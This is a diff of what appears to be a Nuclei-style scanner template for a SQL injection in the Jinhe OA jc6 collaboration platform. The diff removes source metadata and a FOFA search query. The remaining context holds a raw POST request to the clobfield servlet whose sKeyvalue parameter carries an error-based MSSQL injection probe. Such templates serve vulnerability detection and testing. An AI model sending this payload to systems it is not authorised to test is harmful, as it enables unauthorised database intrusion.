@@ -3,12 +3,8 @@ info:
   name: 金和OA jc6 SQL注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rwoywegsqehtdyf9'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rwoywegsqehtdyf9
-    fofa: title="金和协同管理平台"
 http:
 - raw:
   - 'POST /jc6/servlet/clobfield HTTP/1.1
@@ -24,8 +20,6 @@ http:
 
 
     SL-CE-SUID: 77
-
-
 
 
     key=readClob&sImgname=filename&sTablename=FC_ATTACH&sKeyname=djbh&sKeyvalue=1'' and 1=convert(int,(select sys.fn_sqlvarbasetostr(HashBytes(''MD5'',''12345''))))--+
